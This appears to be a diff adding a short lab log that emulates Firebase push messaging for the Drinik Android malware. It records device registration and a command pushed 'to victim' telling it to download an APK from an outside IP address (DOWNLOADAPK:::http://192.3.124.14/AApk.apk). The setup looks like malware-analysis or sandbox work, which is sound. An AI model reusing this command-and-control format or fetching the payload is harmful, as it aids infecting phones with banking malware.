@@ -1,0 +1,12 @@
+[11:34:16.463] [firebase  ] listening on 172.217.114.4:443
+[11:34:16.464] [mtalk     ] listening on 108.177.15.188:5228
+[11:34:17.963] [firebase  ] POST host=firebaseinstallations.googleapis.com path=/v1/projects/drinik-lab-project/installations len=100
+[11:34:18.015] [firebase  ] POST host=android.apis.google.com path=/c2dm/register3 len=78
+[11:34:18.016] [firebase  ] register3 scope=* sender=123456789012 appid=f.drnk-lab-fid-001
+[11:34:18.071] [mtalk     ] registered TLS push client token=fcm-token-drinik-lab-001
+[11:34:18.593] [firebase  ] POST host=fcm.googleapis.com path=/v1/projects/drinik-lab-project/messages:send len=108
+[11:34:18.593] [firebase  ] messages:send token=fcm-token-drinik-lab-001 delivered=1 CMD=DOWNLOADAPK:::http://192.3.124.14/AApk.apk
+[11:34:18.593] [mtalk     ] TLS push data.CMD to victim: {"data":{"CMD":"DOWNLOADAPK:::http://192.3.124.14/AApk.apk"}}
+[11:34:28.899] [firebase  ] stopping
+[11:34:29.021] [mtalk     ] unregistered TLS push client token=fcm-token-drinik-lab-001
+[11:34:29.111] [mtalk     ] stopping
